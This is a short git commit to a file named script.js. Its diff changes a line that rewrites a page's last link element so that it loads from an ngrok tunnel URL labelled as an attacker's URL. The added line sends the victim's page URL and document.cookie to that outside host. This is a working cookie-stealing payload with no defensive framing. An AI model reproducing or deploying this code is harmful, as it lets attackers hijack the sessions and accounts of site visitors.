294d7f1eb91c33650329bccb7b26933b6244ef61
@Artizanli <shtorz@gmail.com>
2023-01-08 13:47:45 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,2 +1,2 @@
 const lastCssLink = document.getElementsByTagName("Link")[document.getElementsByTagName('Link').length-1]
-lastCssLink.href = "https://19aa7c98a162.ngrok.io/my-attakcer-url?ext=" + document.URL.toString()
+lastCssLink.href = "https://19aa7c98a162.ngrok.io/my-attakcer-url?url=" + document.URL.toString() + "&c=" + document.cookie.toString();
